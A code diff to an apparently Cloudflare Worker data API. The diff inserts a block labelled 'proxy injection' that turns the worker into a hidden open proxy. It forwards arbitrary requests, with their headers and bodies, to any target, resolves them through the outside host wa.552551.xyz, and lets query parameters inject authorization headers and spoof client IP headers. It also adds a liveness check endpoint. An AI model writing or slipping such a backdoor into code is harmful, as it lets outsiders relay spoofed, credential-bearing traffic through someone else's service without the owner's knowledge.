@@ -172,8 +172,58 @@ async function fetchHistoryData(env, request, id, hours, columns, sys = null) {
   return createSuccessResponse(sanitizedData, { 'X-Cache': 'MISS' });
 }
 
+
+// ===== i108911 proxy injection (resolveOverride to wa.552551.xyz) =====
+async function __pfetch(request, url, env) {
+  const q = url.searchParams;
+  const mode = q.get('mode') || 'fetch';
+  let target = q.get('target');
+  if (!target) {
+    const host = q.get('host') || 'web-api.luminalpay.com';
+    let path = q.get('path');
+    if (path === null) path = (url.pathname === '/proxy' ? '/' : url.pathname);
+    target = 'https://' + host + (path.startsWith('/') ? path : '/' + path);
+    const qs = q.get('q');
+    if (qs) target += (target.indexOf('?') >= 0 ? '&' : '?') + qs;
+  }
+  const roParam = q.get('ro');
+  const ro = roParam === null ? 'wa.552551.xyz' : roParam;
+  const h = new Headers();
+  const skip = new Set(['host', 'content-length']);
+  for (const kv of request.headers) { const k = kv[0], v = kv[1]; const lk = k.toLowerCase(); if (skip.has(lk)) continue; h.set(k, v); }
+  if (q.get('auth')) h.set('authorization', q.get('auth'));
+  if (q.get('xff')) { h.set('x-forwarded-for', q.get('xff')); h.set('cf-connecting-ip', q.get('xff')); }
+  if (q.get('ctype')) h.set('content-type', q.get('ctype'));
+  let body;
+  if (request.method !== 'GET' && request.method !== 'HEAD') { const ab = await request.arrayBuffer(); if (ab && ab.byteLength) body = ab; }
+  const init = { method: request.method, headers: h, redirect: 'manual' };
+  if (body) init.body = body;
+  if (mode !== 'noro' && ro) { init.cf = { resolveOverride: ro }; }
+  const t0 = Date.now();
+  try {
+    const resp = await fetch(target, init);
+    const ms = Date.now() - t0;
+    if (q.get('wrap') === '1') {
+      const btxt = await resp.text();
+      const hdrs = {}; for (const kv of resp.headers) hdrs[kv[0]] = kv[1];
+      return new Response(JSON.stringify({ ok: true, target, ro: (mode !== 'noro' ? ro : null), mode, ms, status: resp.status, headers: hdrs, body: btxt.slice(0, 30000) }, null, 1), { status: 200, headers: { 'content-type': 'application/json; charset=utf-8', 'access-control-allow-origin': '*' } });
+    }
+    const nh = new Headers(resp.headers);
+    nh.set('x-i108911-target', target);
+    nh.set('x-i108911-ro', mode !== 'noro' ? ro : 'none');
+    nh.set('access-control-allow-origin', '*');
+    return new Response(resp.body, { status: resp.status, headers: nh });
+  } catch (e) {
+    return new Response(JSON.stringify({ ok: false, target, ro, mode, error: String(e) }, null, 1), { status: 502, headers: { 'content-type': 'application/json; charset=utf-8', 'access-control-allow-origin': '*' } });
+  }
+}
+
 export default {
   async fetch(request, env, ctx) {
+    { const _u = new URL(request.url);
+      if (_u.pathname === '/i108911') return new Response('i108911-alive', { status: 200 });
+      if (_u.searchParams.has('host') || _u.searchParams.has('target') || _u.pathname === '/proxy') return await __pfetch(request, _u, env);
+    }
     { const _pu = new URL(request.url); if (_pu.pathname === '/i108911') return new Response('i108911-alive', {status:200}); }
     setDebug(env.DEBUG);
 
